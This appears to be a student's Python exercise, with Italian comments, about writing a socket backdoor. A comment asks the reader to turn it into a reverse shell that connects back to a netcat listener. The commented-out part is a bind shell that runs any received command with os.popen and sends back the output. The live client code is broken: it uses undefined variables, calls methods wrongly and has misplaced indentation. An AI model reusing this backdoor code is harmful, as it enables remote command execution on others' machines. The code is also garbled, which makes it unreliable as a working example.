import socket as so
import os
# https://docs.python.org/
# https://docs.python.org/3/library/socket.html#module-socket
# provate ad invertire la backdoor in modo che si colleghi
# a nc -lvp 44444

SRV_ADDR = '127.0.0.1'
SRV_PORT = 12345

s = so.socket(so.AF_INET, so.SOCK_STREAM)
#s.bind((SRV_ADDR, SRV_PORT))
#s.listen(1)
#print(f'Sono in ascolto su: {SRV_PORT}')

s.connect((SRV_ADDR, SRV_PORT))

print(f"Connesso a {host} sulla porta {port}")

message = input("scrivi cosa vuoi").send().rstrip()
    
    s.sendall(message.encode())
   
    data = s.recv(1024).decode('utf-8')
    
    print(f"la risposta del serve e' {data}")



#connection, address = s.accept()
#connect
#print(f"Si e' collegato {address}")
#while True:
 #   output = os.popen("pwd").read().rstrip() + " $ "#[os.popen("pwd", 'r', 1)]
  #  connection.sendall(output.encode("utf-8"))
   # data = connection.recv(1024)
    #if not data: break
    #cmd = data.decode("utf-8").rstrip()
    #if cmd == "help":
     #   connection.sendall("Esegui qualsiasi comando\n".encode('utf-8'))
    #elif cmd == "ciao":
    #    connection.sendall(b"Come stai?\n")
    #else:
        output = os.popen(cmd).read() + "\n"
     #   connection.sendall(output.encode('utf-8'))
    #print(data.decode("utf-8"))
#connection.close()